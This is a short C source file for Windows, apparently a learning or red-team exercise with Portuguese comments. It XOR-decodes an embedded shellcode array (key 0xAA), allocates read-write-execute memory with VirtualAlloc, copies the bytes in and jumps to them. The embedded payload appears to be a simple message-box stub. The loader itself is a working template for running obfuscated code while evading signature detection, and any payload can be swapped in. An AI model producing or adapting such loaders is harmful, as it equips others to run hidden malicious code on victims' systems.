#include <stdio.h>
#include <Windows.h>

VOID Xor(PBYTE pShellcode, SIZE_T sShellcodeSize, BYTE bKey);

unsigned char encoded_buf[] =
"\x56\xe2\x2b\x4e\x5a\x55\x55\x55\x42\x7a\xaa\xaa\xaa\xeb\xfb\xeb\xfa"
"\xf8\xfb\xfc\xe2\x9b\x78\xcf\xe2\x21\xf8\xca\x94\xe2\x21\xf8\xb2\x94"
"\xe2\x21\xf8\x8a\x94\xe2\x21\xd8\xfa\x94\xe2\xa5\x1d\xe0\xe0\xe7\x9b"
"\x63\xe2\x9b\x6a\x06\x96\xcb\xd6\xa8\x86\x8a\xeb\x6b\x63\xa7\xeb\xab"
"\x6b\x48\x47\xf8\xeb\xfb\x94\xe2\x21\xf8\x8a\x94\x21\xe8\x96\xe2\xab"
"\x7a\x94\x21\x2a\x22\xaa\xaa\xaa\xe2\x2f\x6a\xde\xc5\xe2\xab\x7a\xfa"
"\x94\x21\xe2\xb2\x94\xee\x21\xea\x8a\xe3\xab\x7a\x49\xf6\xe2\x55\x63"
"\x94\xeb\x21\x9e\x22\xe2\xab\x7c\xe7\x9b\x63\xe2\x9b\x6a\x06\xeb\x6b"
"\x63\xa7\xeb\xab\x6b\x92\x4a\xdf\x5b\x94\xe6\xa9\xe6\x8e\xa2\xef\x93"
"\x7b\xdf\x7c\xf2\x94\xee\x21\xea\x8e\xe3\xab\x7a\xcc\x94\xeb\x21\xa6"
"\xe2\x94\xee\x21\xea\xb6\xe3\xab\x7a\x94\xeb\x21\xae\x22\xe2\xab\x7a"
"\xeb\xf2\xeb\xf2\xf4\xf3\xf0\xeb\xf2\xeb\xf3\xeb\xf0\xe2\x29\x46\x8a"
"\xeb\xf8\x55\x4a\xf2\xeb\xf3\xf0\x94\xe2\x21\xb8\x43\xe3\x55\x55\x55"
"\xf7\x94\xe2\x27\x27\xb5\xab\xaa\xaa\xeb\x10\xe6\xdd\x8c\xad\x55\x7f"
"\xe3\x6d\x6b\xaa\xaa\xaa\xaa\x94\xe2\x27\x3f\xa4\xab\xaa\xaa\x94\xe6"
"\x27\x2f\xb3\xab\xaa\xaa\xe2\x9b\x63\xeb\x10\xef\x29\xfc\xad\x55\x7f"
"\xe2\x9b\x63\xeb\x10\x5a\x1f\x08\xfc\x55\x7f\xe0\xe5\xe4\xeb\xf9\x8a"
"\xe7\xeb\xe3\xeb\xaa\xfe\xef\xf9\xfe\xef\xaa\xdf\xd9\xcf\xd8\x99\x98"
"\x84\xce\xc6\xc6\xaa";


int main() {

	SIZE_T shellcode_size = sizeof(encoded_buf);
	IN BYTE key = 0xAA; // A mesma chave usada na codificação

	Xor(encoded_buf, shellcode_size, key);

	void* buffer = VirtualAlloc(
		NULL,
		shellcode_size,
		(MEM_COMMIT | MEM_RESERVE),
		PAGE_EXECUTE_READWRITE);
	printf("[+] Alocado %zu-bytes com permissao PAGE_EXECUTE_READWRITE\n", shellcode_size);

	if (buffer == NULL) {
		printf("[+] Falha ao alocar memoria");
	}

	memcpy(buffer, encoded_buf, shellcode_size);

	void (*shellcode_func)() = (void (*)())buffer;
	shellcode_func();

	return 0;
}

VOID Xor(PBYTE pShellcode, SIZE_T sShellcodeSize, BYTE bKey) {
	for (size_t i = 0; i < sShellcodeSize; i++) {
		pShellcode[i] = pShellcode[i] ^ bKey;
	}
}

// VOID PrintShellcode(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize) {
// 	printf("Decoded Shellcode: \n\"");
// 	for (size_t i = 0; i < sShellcodeSize; i++) {
// 		printf("\\x%02x", pShellcode[i]); // Formato \xHH
// 	}
// 	printf("\"\n");
// }
